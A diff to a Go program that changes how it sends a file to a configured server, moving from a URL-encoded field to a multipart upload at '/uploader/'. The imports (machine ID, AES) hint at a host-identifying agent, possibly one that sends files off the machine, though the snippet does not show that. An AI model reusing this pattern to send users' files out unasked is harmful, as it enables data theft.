@@ -1,10 +1,9 @@
 package main
 
 import (
-	"strings"
-
 	"github.com/denisbrodbeck/machineid"
 
+    "bytes"
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/rand"
@@ -17,6 +16,7 @@ import (
 	"io/ioutil"
 	"log"
 	"math/big"
+    "mime/multipart"
 	"net/http"
 	"net/url"
 	"os"
@@ -183,20 +183,21 @@ func main() {
                 panic(err)
             }
 
-            str, err := ioutil.ReadAll(file)
+            body := &bytes.Buffer{}
+            writer := multipart.NewWriter(body)
+            part, _ := writer.CreateFormFile("file", filepath.Base(file.Name()))
+            io.Copy(part, file)
+            writer.Close()
+
+            req, err := http.NewRequest("POST", "http://" + server + "/uploader/", body)
             if err != nil {
                 panic(err)
             }
 
-            form := url.Values{}
-            form.Add("xxx", string(str))
-            req, err := http.NewRequest("POST", "http://" + server, strings.NewReader(form.Encode()))
-            if err != nil {
-                panic(err)
-            }
-            req.Header.Add("Content-Type", "application/x-form-url-encode")
+            req.Header.Add("Content-Type", writer.FormDataContentType())
 
             resp, err := hc.Do(req)
+
             fmt.Println(resp.StatusCode)
         }
 
